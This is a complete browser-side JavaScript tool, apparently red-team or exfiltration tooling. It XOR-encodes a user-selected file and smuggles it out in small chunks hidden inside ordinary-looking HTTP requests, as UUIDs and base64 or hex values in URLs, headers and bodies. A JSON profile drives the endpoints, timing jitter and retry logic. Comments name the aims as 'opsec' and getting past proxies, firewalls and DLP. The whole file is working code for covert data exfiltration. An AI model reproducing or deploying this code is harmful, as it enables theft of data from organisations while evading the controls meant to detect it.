// This controls how many times the system can recurse upon encountering an error.
const MAX_DEPTH = 8;

// This controls a ratio for deciding whether to continue/stop after an error.
// If the # of errored endpoints is less than this value, keep going. For
// example, if there are 8 endpoints and a ratio of 0.5, then the loop will
// recurse even if it encounters errors in 1, 2, 3, or 4 endpoints. An
// "endpoint" refers to the different (method, url) pairs defined in the
// profile. A higher ratio means higher confidence that other requests will be
// able to share the burden of the errored endpoints.
const IGNORE_ERRORS_WHEN_FAIL_BELOW_RATIO = 0.26;

const PATTERN_NAMES = ['chunkNo', 'currentIndex', 'finalIndex', 'retries', 'filename', 'checksum'];

const profdata = document.getElementById('profdata').textContent.trim();
if (!profdata) {
    throw new Error("no profdata available");
}
const { encryption, patterns, vars, common, intermittent, cycle } = JSON.parse(profdata);

function generateRandom(n) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const bytes = new Uint8Array(n);
    crypto.getRandomValues(bytes);
    return Array.from(bytes, b => chars[b % chars.length]).join('');
}
function randomLoHi(lo, hi) {
    return Math.floor(lo + (hi - lo + 1) * Math.random());
}

function bytesToUuid(bytes) {
  const hexOctets = Array.from(bytes, (byte) => {
    return ('0' + byte.toString(16)).slice(-2);
  });

  // The format is 8-4-4-4-12 hex digits
  const uuid = [
    hexOctets.slice(0, 4).join(''),
    hexOctets.slice(4, 6).join(''),
    hexOctets.slice(6, 8).join(''),
    hexOctets.slice(8, 10).join(''),
    hexOctets.slice(10, 16).join(''),
  ].join('-');

  return uuid;
}

function bytesToHexString(bytes) {
  return Array.from(bytes)
    .map(byte => byte.toString(16).padStart(2, '0'))
    .join('');
}

function djb2(uint8Array) {
  let hash = 5381;
  for (let i = 0; i < uint8Array.length; i++) {
    // hash * 33 + c
    hash = ((hash << 5) + hash) + uint8Array[i];
  }
  // Ensure 32-bit unsigned integer
  return hash >>> 0;
}

function str2u8(s) {
    return new TextEncoder().encode(s);
}

class XorEncryptor {
    constructor(key) {
        this.key = str2u8(key);
    }

    encrypt(data) {
        const result = new Uint8Array(data.length);
        for (let i = 0; i < data.length; i++) {
            result[i] = data[i] ^ this.key[i % this.key.length];
        }
        return result;
    }
}

class PayloadTransformer {
    /**
     * @param {Uint8Array} payload 
     * @param {Function} encryptor 
     */
    constructor(payload) {
        this.payload = payload;
        // this.encryptor = encryptor ?? { encrypt(x, i) { return x; } };
        this.index = 0;
    }

    finished() {
        return this.index >= this.payload.length;
    }

    hash(from, to) {
        const buf = this.payload.subarray(from, to);
        return djb2(buf);
    }

    subarray(from, to) {
        if (from >= to) {
            throw new Error(`unexpected payload subrange ${from}-${to}`);
        }
        return new PayloadTransformer(this.payload.subarray(from, to));
    }

    next(nLo, nHi) {
        const rand = (nLo === nHi || !nHi) ? nLo : randomLoHi(nLo, nHi);
        const remaining = this.payload.length - this.index;
        const take = Math.min(rand, remaining);
        let buf = this.payload.subarray(this.index, this.index + take);
        // buf = this.encryptor.encrypt(buf, nLo);
        if (buf.length !== take) {
            throw new Error(`encryption did not return same length of buffer`);
        }
        this.index += take;
        if (take === rand) {
            return buf;
        }
        
        // Not enough bytes, return a padded buffer.
        const padded = new Uint8Array(rand);
        padded.set(buf);
        return padded;
    }

    nextB64(nLo, nHi) {
        return this.next(nLo, nHi).toBase64().replaceAll("=", "");
    }

    nextUuid() {
        const buf = this.next(16);
        return bytesToUuid(buf);
    }

    nextHex(nLo, nHi) {
        const buf = this.next(nLo, nHi);
        return bytesToHexString(buf);
    }
}

class VarGenerator {
    constructor(vars) {
        vars = vars ?? [];
        this.generators = {};
        for (const schema of vars) {
            const name = schema.name;
            let gen = () => "";
            if (schema.type === "cycle") {
                gen = (() => {
                    let index = 0;
                    return () => {
                        const item = schema.items[index];
                        index = (index + 1) % schema.items.length;
                        return item;
                    };
                })();
            } else if (schema.type === "random") {
                gen = () => {
                    return schema.items[randomLoHi(0, schema.items.length - 1)];
                };
            } else {
                throw `expected valid var.{var}.type, but got ${schema.type}`;
            }
            this.generators[name]  = gen;
        }
    }

    hasVariable(name) {
        return Object.keys(this.generators).includes(name);
    }

    generate(name) {
        return this.generators[name]();
    }
}

class Sequence {
    constructor(seq) {
        this.seq = seq;
    }

    generate(ctx) {
        let out = "";
        for (const f of this.seq)
            out += f.call(ctx);
        return out;
    }
}

class PayloadGenerator {
    constructor({ vgenerator, payloader }) {
        this.vgenerator = vgenerator;
        this.payloader = payloader;
        this.regex = /(\$\{(?:var|uuid|uuidlist|b64|hex)(?::[a-zA-Z0-9]+)?(?::[0-9]+)?\})/g;
    }

    build(s) {
        const seq = [];
        let expectedTotalBytes = 0;
        const parts = s.split(this.regex);
        for (const part of parts) {
            if (part.startsWith('${')) {
                const s = part.substring(2, part.length - 1);
                let [tag, ...args] = s.split(':');
                const val = this.validateArgs(tag, ...args);
                if (typeof val === 'string') {
                    const err = { type: "parsing_error", token: part, error: val, context: s };
                    console.error(err);
                    continue;
                }
                [tag, ...args] = val;
                seq.push(this.makePayload(tag, ...args));
                expectedTotalBytes += this.expectedBytes(tag, ...args);
            } else {
                if (!part) // Empty string / null.
                    continue;
                // This is a regular string, add a simple generator and push it.
                seq.push(() => part);
            }
        }
        return [new Sequence(seq), expectedTotalBytes];
    }

    validateArgs(tag, ...args) {
        if (tag === 'var') {
            if (args.length !== 1) {
                return `expected 1 arg, got ${args.length}`;
            } else if (args[0].match(/^\w+$/) === null) {
                return `expected identifier, got ${args[0]}`;
            }
        } else if (tag === 'uuid') {
            if (args.length !== 0) {
                return `expected 0 args, got ${args.length}`;
            }
        } else if (tag === 'b64' || tag === 'hex' || tag === 'uuidlist') {
            if (args.length < 1 || args.length > 2) {
                return `expected 1-2 args, got ${args.length}`;
            } else if (Number.isNaN(Number(args[0]))) {
                return `expected arg #0 to be a number, got ${args[0]}`;
            } else if (args.length > 1 && Number.isNaN(Number(args[1]))) {
                return `expected arg #1 to be a number, got ${args[1]}`;
            }
            return [tag, Number(args[0]), Number(args[1])];
        } else {
            return `unknown tag: ${tag}`;
        }
        return [tag, ...args];
    }

    makePayload(tag, ...args) {
        // Convert a ${...} into a function (void) => string.
        if (tag === 'var') {
            if (!this.vgenerator.hasVariable(args[0])) {
                throw new Error(`no such variable: ${args[0]}`)
            }
            return function() { return this.vgenerator.generate(...args) };
        } else if (tag === 'uuid') {
            return function() { return this.payloader.nextUuid() };
        } else if (tag === 'uuidlist') {
            return function() {
                let out = '[';
                const n = (!args[1] || args[0] === args[1]) ? args[0] : randomLoHi(args[0], args[1]);
                for (let i = 0; i < n; i++) {
                    out += `"${this.payloader.nextUuid()}"`;
                    if (i + 1 < n) {
                        out += ',';
                    }
                }
                out += ']';
                return out;
            };
        } else if (tag === 'b64') {
            return function() { return this.payloader.nextB64(...args) };
        } else if (tag === 'hex') {
            return function() { return this.payloader.nextHex(...args) };
        } else {
            throw new Error(`unexpected tag: ${tag}`);
        }
    }

    expectedBytes(tag, ...args) {
        // Returns the expected value (average number) of bytes consumed.
        if (tag === 'uuid') {
            return 16;
        } else if (tag === 'b64' || tag == 'hex') {
            return args[1] ? (args[0] + args[1]) / 2 : args[0];
        } else {
            return 0;
        }
    }
}

class Request {
    constructor(gen, { url, method, headers, body, repeat, on }) {
        let bytes, expectedBytes = 0;
        [this.url, bytes] = gen.build(url);
        expectedBytes += bytes;
        
        this.method = method ?? 'GET';
        this.key = `${this.method}_${url}`;
        this.headers = [];
        headers = headers ?? {};
        for (const [k, v] of Object.entries(headers)) {
            const [payload, bytes] = gen.build(v);
            this.headers.push([k, payload]);
            expectedBytes += bytes;
        }
        if (body) {
            const [payload, bytes] = gen.build(body);
            this.body = payload;
            expectedBytes += bytes;
        } else {
            this.body = null;
        }

        this.repeat = repeat ? () => randomLoHi(...repeat) : () => 0;
        this.expectedBytes = expectedBytes;
        
        on = on ?? [];
        this.onMapping = this._buildActions(on);
    }

    _buildActions(on) {
        const onMapping = {};
        const seenActions = [];

        for (const rule of on) {
            if (!rule.action) {
                throw new Error(`expected [request].on.action field`);
            }
            
            let status = rule.status;
            if (!status) {
                throw new Error(`expected [request].on.status field`);
            }

            if (Number.isInteger(status)) {
                status = [status];
            }
            else if (Array.isArray(status) && status.every(Number.isInteger)) {
                // pass
            }
            else {
                throw new Error(`invalid type for [request].on.status`);
            }

            for (const s of status) {
                onMapping[s] = rule;
            }

            const action = rule.action.toLowerCase();
            seenActions.push(action);
        }

        // Pre-fill default actions
        if (!seenActions.includes("ok")) {
            // No user-defined ok action? => 200
            onMapping[200] = {
                status: [200],
                action: "ok",
            };
        }
        if (!seenActions.includes("error")) {
            // No user-defined error action? => 400
            onMapping[400] = {
                status: [400],
                action: "error",
            };
        }
        if (!seenActions.includes("retry")) {
            // No user-defined retry action? => 429
            onMapping[429] = {
                status: [429],
                action: "retry",
            };
        }
        
        // Reserved status.
        onMapping[502] = {
            status: [502],
            action: "sserror",
        };
        return onMapping;
    }

    matchActionFromStatus(status) {
        return this.onMapping[status]?.action ?? null;
    }

    generate(ctx, common) {
        const { headers } = common;
        // Sort headers before generating. This is super important to maintain ordering.
        const sortedHeaders = [...headers, ...this.headers].sort(([a, _1], [b, _2]) => a.localeCompare(b, undefined, { sensitivity: 'base' }))
        // Return fetch arguments.
        return [
            this.url.generate(ctx),
            {
                method: this.method,
                headers: Object.fromEntries([
                    ...sortedHeaders.map(([k, v]) => [k, `${v.generate(ctx)}`]),
                ]),
                body: this.body ? this.body.generate(ctx) : undefined,
                // "mode": "no-cors",
                // "credentials": "include",
            },
        ]
    }
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function nextFrame() {
  return new Promise(resolve => {
    requestAnimationFrame(resolve);
  });
}

class IntermittentRequest extends Request {
    constructor(every, gen, request) {
        super(gen, request);
        const [lo, hi] = every;
        if (lo > hi)
            throw new Error(`expected lo < hi (intermittent.[].every), got ${lo} > ${hi}`)
        this.every = () => randomLoHi(lo, hi);
    }
}

function addPattern(url, options, pattern, state) {
    if (pattern.type === 'header') {
        if (!pattern.name)
            throw new Error(`expected pattern.name, got ${pattern}`);
        options.headers[pattern.name] = state;
    } else {
        throw new Error(`unknown pattern type: ${pattern.type}`);
    }
    return [url, options];
}

class SequencedRequest {
    constructor(gen, requests, count, delay, maxRetries) {
        this.count = count ? (() => randomLoHi(...count)) : () => 1;
        this.delay = delay ? (() => randomLoHi(...delay)) : () => 5000;
        this.maxRetries = maxRetries ?? 0;
        this.requests = requests.map(r => new Request(gen, r));
    }

    async sendSequence(reqr) {
        let nCount = this.count();
        let req_index = 0;
        while (nCount > 0) {
            const req = this.requests[req_index];
            const repeat = req.repeat();
            for (let i = 0; i < repeat + 1; i++) {
                if (reqr.finished())
                    return;
                await reqr.sendWithRetry(req, { maxRetries: this.maxRetries, delay: this.delay });
                nCount--;
                if (nCount <= 0)
                    return;
            }
            req_index = (req_index + 1) % this.requests.length; 
        }
    }
}

class Requester {
    constructor({ payloader, generator, patterns, intermittent, cycle, common, filename, byteOffset, actualLength, depth }) {
        this.payloader = payloader;
        this.generator = generator;
        this.patterns = patterns;
        this.intermittent = intermittent;
        this.cycle = cycle;
        this.common = common ?? null;
        this.filename = filename;
        this.chunkNo = 0;
        this.running = false;
        this.health = new HealthTracker({
            minSuccessRatio: 0.6,
            historySize: 12,
        });
        this.byteOffset = byteOffset ?? 0; // For situations where we need to send a buffer at an offset.
        this.actualLength = actualLength ?? this.payloader.payload.length;
        this.depth = depth ?? 0;
        // this.onprogress = () => {};
        this.startIntermittent();
    }
    
    static make({ payloader, generator, patterns, intermittent, cycle, common, filename }) {
        const _common = { headers: [] };
        if (common) {
            for (const hdr of Object.keys(common.headers)) {
                _common.headers[hdr] = generator.build(common.headers[hdr]);
            }
        }
        if (!intermittent) {
            intermittent = [];
        }
        if (!cycle) {
            cycle = [];
        }
        if (cycle.length === 0 && intermittent.length === 0) {
            throw new Error(`expected cycle or intermittent to be non-empty`);
        }
        intermittent = intermittent.map(x => new IntermittentRequest(x.every, generator, x.req));
        cycle = cycle.map(c => new SequencedRequest(generator, c.req, c.count, c.delay, c.maxRetries))
        return new Requester({
            payloader,
            generator,
            patterns,
            intermittent,
            cycle,
            common: _common,
            filename,
        });
    }

    startIntermittent() {
        this.intermittentIntervals = [];
        for (const iRequest of this.intermittent) {
            async function iRecursive() {
                if (this.finished())
                    return;
                console.log(`>--> intermittent, chunk #${this.chunkNo}`);
                this.chunkNo++;
                await this.sendWithRetry(iRequest);
                setTimeout(iRecursive.bind(this), iRequest.every());
            }
            setTimeout(iRecursive.bind(this), iRequest.every());
        }
    }

    finished() {
        return this.payloader.finished() || !this.running;
    }

    updateProgress() {
        // this.onprogress(this.chunkNo, this.byteOffset + this.payloader.index, this.actualLength, this.startTime);
        const index = this.byteOffset + this.payloader.index;
        const length = this.actualLength;
        const elapsedTime = Date.now() - this.startTime;
        const eta = new Date(this.startTime + elapsedTime / (index / length));
        window.updateUploadProgress({
            percent: 100 * index / length,
            loaded: index,
            total: length,
            eta: `${formatRelativeTime(eta)} (${eta.toTimeString()})`,
        })
    }

    async send(req, state) {
        state = {
            ...state,
            chunkNo: this.chunkNo,
            currentIndex: this.byteOffset + this.payloader.index,
            filename: this.filename.split('').reverse().join(''), // TODO: better opsec
        };
        let [url, options] = req.generate(this.generator, this.common);
        state.finalIndex = this.byteOffset + this.payloader.index;
        state.checksum = this.payloader.hash(state.currentIndex - this.byteOffset, state.finalIndex - this.byteOffset);

        // Add state patterns.
        for (const x of PATTERN_NAMES) {
            if (this.patterns[x] !== undefined && state[x] !== undefined) {
                [url, options] = addPattern(url, options, this.patterns[x], state[x]);
            }
        }

        let actualRetry = 10, backoff = 1000;
        while (--actualRetry) {
            try {
                const resp = await fetch(url, options);
                if (!resp)
                    throw new Error(`resp is ${resp}`);
                return [resp, state];
            } catch (e) {
                // Retry on (network) error, but wait a bit first.
                console.error(`fetch error: ${e}, trying again in ${backoff}ms, ${actualRetry} retries left`);
                await delay(backoff);
                backoff = Math.min(backoff * 2, 60000); // At most 1min between waits.
            }
        }
    }

    /**
     * @param {Request} req
     * @param {Object} [opts]
     * @param {number} [opts.maxRetries=0]   - Maximum number of "retries"
     * @param {number} [opts.delay]          - RNG function, to generate a number of milliseconds to delay
     */
    async sendWithRetry(req, opts) {
        const recentHealth = this.health.getRecentHealth(req.key);
        if (recentHealth.numRecent >= Math.min(5, this.health.historySize)
            && recentHealth.recentSuccessLoad === 0)
        {
            // It's been failing the past N requests. Skip this request
            // completely. Effectively, this means we remove it from the pool of
            // available requests to send, which may lengthen the upload time.
            console.log(`Skipping request ${req.key} due to too many failures.`);
            return;
        }

        const { maxRetries, delay: delayf } = opts ?? {};
        let retries = maxRetries ?? 0;
        while (retries >= 0) {
            if (this.finished())
                return;

            console.log(`>--> sequenced, chunk #${this.chunkNo}`);
            this.chunkNo++;
            const [resp, finalState] = await this.send(req, { retries });
            this.updateProgress();
            retries -= 1;
            
            const bytesInPayload = finalState.finalIndex - finalState.currentIndex;
            const semanticAction = req.matchActionFromStatus(resp.status);
            console.log(`${req.key} / chunk#${finalState.chunkNo}, #bytes=${bytesInPayload}, status=${resp.status}, action --> ${semanticAction}`);
            if (semanticAction === "retry") {
                this.health.registerState(req.key, bytesInPayload, true);
                if (delayf) await delay(Math.min(randomLoHi(50, 200), delayf()));
                continue;
            } else if (semanticAction === "ok") {
                this.health.registerState(req.key, bytesInPayload, true);
                if (delayf) await delay(delayf());
                return; // Sending done.
            } else if (semanticAction === "sserror") {
                // This should not normally happen within a normal program.
                // Break off if a server-side error occurred.
                console.error(`a server-side error occurred: ${resp.status}, chunk ${finalState.chunkNo}`);
                this.stop();
                if (delayf) await delay(delayf());
                return;
            } else if (semanticAction === "error" || true /* else */) {
                if (semanticAction !== "error") {
                    // Likely Proxy, firewall, DLP.
                    console.error(`unexpected status code: ${resp.status}, chunk ${finalState.chunkNo}`);
                }
                if (delayf) await delay(delayf());

                // Compute verdict before registering this failure data. We want
                // to make the resend decision based on the past.
                const verdict = this.health.queryContinue();
                this.health.registerState(req.key, bytesInPayload, false);
                console.log(`resend? verdict=${verdict}`);
                if (verdict) {
                    await this.handleSendFailAndResend(finalState);
                    // TODO: currently there is NO way to know if the resend worked
                } else {
                    await this.handleSendFailAndGiveUp(finalState);
                }
            }
        }
    }

    async handleSendFailAndResend(state) {
        const resendPayloader = this.payloader.subarray(state.currentIndex, state.finalIndex);
        const reqr = new Requester({
            payloader: resendPayloader,
            generator: new PayloadGenerator({
                vgenerator: this.generator.vgenerator,
                payloader: resendPayloader,
            }),
            patterns: this.patterns,
            intermittent: this.intermittent,
            cycle: this.cycle,
            common: this.common,
            filename: this.filename,
            byteOffset: state.currentIndex,
            actualLength: this.actualLength,
            depth: this.depth + 1,
        });
        // reqr.onprogress = this.onprogress;

        // TODO: make this non-recursive to avoid potential stack overflows, although the chances of that are probably slim
        try {
            // TODO: using await here is intended, so that it runs "in the same
            // thread" as the current requests. However, other "threads" will still continue firing.
            // For example, if we are inside the sequenced requests, intermittent requests will continue firing.
            // Or if we are inside an intermittent request, sequenced requests will continue firing. 
            await reqr.loop();
        } catch (e) {
            // Didn't work? Let's just stop.
            this.stop();
            console.error(`hard stop (depth: ${this.depth})`);
            if (this.depth === 0) {
                await this.handleSendFailAndGiveUp();
            }
            // throw new Error("hard stop"); // Stop any other parent resends.
        }
    }

    async handleSendFailAndGiveUp(state) {
        console.error(`Error: send failure`);
        console.error(state);
        window.statusError(`fail`);
        this.stop();
        debugger;
    }

    async loop() {
        if (this.depth >= MAX_DEPTH) {
            throw new Error(`forcing stop after ${MAX_DEPTH} recursive iterations`);
        }

        // TODO: save and restore progress from local storage
        this.startTime = Date.now();
        this.running = true;
        let stageIndex = 0;
        while (!this.finished()) {
            const stage = this.cycle[stageIndex];
            console.log(`stage #${stageIndex+1}/${this.cycle.length}, chunk #${this.chunkNo}`);
            
            await stage.sendSequence(this);
            stageIndex = (stageIndex + 1) % this.cycle.length;
        }
    }

    start() {
        this.running = true;
    }

    stop() {
        this.running = false;
    }
}

/**
 * Tracks success/failure using fixed-size per-key history (no timestamps).
 * Load is accumulated forever per key for overall weight tracking.
 * Recent performance is judged only from the fixed-size recent operations buffer.
 */
class HealthTracker {
  /**
   * @param {Object} [options]
   * @param {number} [options.minSuccessRatio=0.4]     - Minimum weighted success ratio in recent window
   * @param {number} [options.historySize=12]          - Fixed number of recent operations kept per key
   */
  constructor(options = {}) {
    this.minSuccessRatio = options.minSuccessRatio ?? 0.4;
    this.historySize = options.historySize ?? 12;

    // key → { totalLoad: number, successLoad: number, recent: Array<{load: number, success: boolean}> }
    // recent is a circular buffer (fixed max length)
    this.tracked = new Map();
  }

  /**
   * Register an operation result
   * @param {string} key       - Identifier (e.g. "upload-chunk", "api-/users")
   * @param {number} load      - Weight/importance (positive integer)
   * @param {boolean} success  - Whether it succeeded
   */
  registerState(key, load, success) {
    if (!Number.isInteger(load) || load < 0) {
      throw new Error("load must be a positive integer");
    }

    if (!this.tracked.has(key)) {
      this.tracked.set(key, {
        totalLoad: 0,
        successLoad: 0,
        recent: [],                   // acts as circular buffer
        nextIndex: 0
      });
    }

    const entry = this.tracked.get(key);

    // Accumulate total lifetime load (never reset)
    entry.totalLoad += load;
    if (success) {
      entry.successLoad += load;
    }

    // Manage fixed-size recent history (circular overwrite)
    const hist = entry.recent;

    if (hist.length < this.historySize) {
      // Still filling up
      hist.push({ load, success });
    } else {
      // Overwrite oldest entry
      hist[entry.nextIndex] = { load, success };
      entry.nextIndex = (entry.nextIndex + 1) % this.historySize;
    }
  }

  /**
   * @param {string} key 
   * @returns {{load, success} | null}
   */
  getMostRecentEntry(key) {
    const entry = this.tracked.get(key) ?? null;
    if (!entry)
        throw new Error(`no such entry: ${key}`);
    this.#getMostRecentItemFromEntry(entry);
  }

  #getMostRecentItemFromEntry(entry) {
    if (entry.recent.length < this.historySize) {
        return entry.recent[entry.recent.length - 1];
    } else {
        const lastIndex = (entry.nextIndex + this.historySize - 1) % this.historySize;
        return entry.recent[lastIndex];
    }
  }

  /**
   * Decide whether to continue operations based on **recent** weighted success rate.
   * Looks only at the fixed-size history per key, aggregates across all keys.
   * Returns `true` if overall recent weighted success ≥ minSuccessRatio.
   * Returns `false` if too many recent failures (weighted).
   * If no recent data at all → returns `true` (fail-open).
   *
   * @returns {boolean}
   */
  queryContinue() {
    let globalRecentTotalLoad = 0;
    let globalRecentSuccessLoad = 0;
    let totalCount = 0;
    let failCount = 0;

    // Question: How many API endpoints are still successful?
    for (const entry of this.tracked.values()) {
        totalCount++;
        if (entry.recent.length === 0) {
            // Treat as succeeded.
            continue;
        }
        const { load, success } = this.#getMostRecentItemFromEntry(entry);
        if (!success)
            failCount++;
        
        for (const op of entry.recent) {
            globalRecentTotalLoad += op.load;
            if (op.success) {
                globalRecentSuccessLoad += op.load;
            }
        }
    }

    const ratio = globalRecentSuccessLoad / globalRecentTotalLoad;
    console.log(`queryContinue: succ=${totalCount-failCount}/${totalCount}, load=${globalRecentSuccessLoad}/${globalRecentTotalLoad}, ratio=${Math.floor(ratio * 100)}%`)

    // When global byte transfer is low, we just allow continuing. This provides
    // some leeway for the first few requests, since there may not have been not
    // much transfer going on.
    if (failCount <= IGNORE_ERRORS_WHEN_FAIL_BELOW_RATIO * totalCount) {
      return true;
    }

    return ratio >= this.minSuccessRatio;
  }

  /**
   * Get diagnostic info for a specific key
   * @param {string} key
   * @returns {{globalRecentRatio: number, recentTotalLoad: number, recentSuccessLoad: number, minRequired: number}}
   */
  getRecentHealth(key) {
    let recentTotalLoad = 0;
    let recentSuccessLoad = 0;

    const entry = this.tracked.get(key) ?? { recent: [] };
    for (const op of entry.recent) {
        recentTotalLoad += op.load;
        if (op.success) recentSuccessLoad += op.load;
    }

    return {
        globalRecentRatio: recentTotalLoad > 0 ? recentSuccessLoad / recentTotalLoad : 1,
        recentTotalLoad,
        recentSuccessLoad,
        numRecent: entry.recent.length,
        minRequired: this.minSuccessRatio,
    };
  }

  /**
   * Get lifetime stats for a specific key (accumulated forever)
   * @param {string} key
   * @returns {{totalLoad: number, successLoad: number, lifetimeRatio: number}|null}
   */
  getLifetimeStats(key) {
    const entry = this.tracked.get(key);
    if (!entry) return null;

    return {
      totalLoad: entry.totalLoad,
      successLoad: entry.successLoad,
      lifetimeRatio: entry.totalLoad > 0 ? entry.successLoad / entry.totalLoad : 1,
    };
  }

  /**
   * Clear everything (for testing / reset)
   */
  reset() {
    this.tracked.clear();
  }
}

// const elStatus = document.getElementById('status');
// const elTask = document.getElementById('task');

const relativeTimeFormatter = new Intl.RelativeTimeFormat("en-US", { numeric: "auto" });

function formatRelativeTime(date) {
  const SECONDS = 1000;
  const MINUTES = SECONDS * 60;
  const HOURS = MINUTES * 60;
  const DAYS = HOURS * 24;
  const MONTHS = DAYS * 30; // Approximation
  const YEARS = DAYS * 365; // Approximation

  const difference = date.getTime() - Date.now();
  const absoluteDifference = Math.abs(difference);

  if (absoluteDifference < MINUTES) {
    return relativeTimeFormatter.format(Math.round(difference / SECONDS), "second");
  } else if (absoluteDifference < HOURS) {
    return relativeTimeFormatter.format(Math.round(difference / MINUTES), "minute");
  } else if (absoluteDifference < DAYS) {
    return relativeTimeFormatter.format(Math.round(difference / HOURS), "hour");
  } else if (absoluteDifference < MONTHS) {
    return relativeTimeFormatter.format(Math.round(difference / DAYS), "day");
  } else if (absoluteDifference < YEARS) {
    return relativeTimeFormatter.format(Math.round(difference / MONTHS), "month");
  } else {
    return relativeTimeFormatter.format(Math.round(difference / YEARS), "year");
  }
}

async function computeHash(alg, buffer) {
    const hashBuffer = await window.crypto.subtle.digest(alg, buffer); 
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    return hashHex;
}

const form = document.getElementsByTagName('form')[0];
form.addEventListener('submit', async (e) => {
    e.preventDefault();
    if (window.activeRequester && !window.activeRequester.finished()) {
        console.error(`an active requester is already running, stop it first`);
        return;
    }
    const fileInput = document.getElementById('fileInput');
    const file = fileInput.files[0];
    
    let buffer = new Uint8Array(await file.arrayBuffer());
    console.log(`loaded ${buffer.length} bytes`)

    let encryptor = null;
    if (encryption) {
        if (encryption.type === 'xor') {
            if (!encryption.key) {
                throw new Error(`empty encryption key`);
            }
            encryptor = new XorEncryptor(encryption.key);
        } else {
            throw new Error(`unknown encryption type: ${encryption.type}`);
        }
    }

    const originalBuffer = buffer;
    if (encryptor) {
        console.log(`encrypting...`);
        window.setStatus('encrypting...');
        nextFrame();
        buffer = encryptor.encrypt(buffer);
        console.log(`encryption done!`);
        window.clearStatus();
    }

    const payloader = new PayloadTransformer(buffer);
    const vgenerator = new VarGenerator(vars);
    const generator = new PayloadGenerator({ vgenerator, payloader });
    const fnSplat = file.name.split('.')
    if (fnSplat.length >= 2) {
        // Give the filename a bit of uniqueness.
        fnSplat[fnSplat.length - 2] += '_' + generateRandom(6);
    } else {
        fnSplat[0] += '_' + generateRandom(6);
    }
    const filename = fnSplat.join('.');

    if (!window.crypto.subtle) {
        window.updateUploadProgress({ sha1: '(Unable to compute hash, no subtlecrypto, possibly due to unencrypted HTTP connection.)', sha256: '—' })
    } else {
        const sha1 = await computeHash('SHA-1', originalBuffer);
        const sha256 = await computeHash('SHA-256', originalBuffer);
        window.updateUploadProgress({sha1, sha256});
    }
    window.updateUploadProgress({ filename });

    const reqr = Requester.make({ payloader, generator, patterns, intermittent, cycle, common, filename });
    window.activeRequester = reqr;
    nextFrame();
    reqr.loop();
});
form.addEventListener('reset', async (e) => {
    e.preventDefault();
    if (window.activeRequester)
        window.activeRequester.stop();
});
// TODO: provide resume feature? but need to handle how requests may be skipped since we stopped it before
// document.getElementById('resume').addEventListener('click', async (e) => {
//     e.preventDefault();
//     console.log('wooah')
//     if (window.activeRequester)
//         window.activeRequester.start();
// });

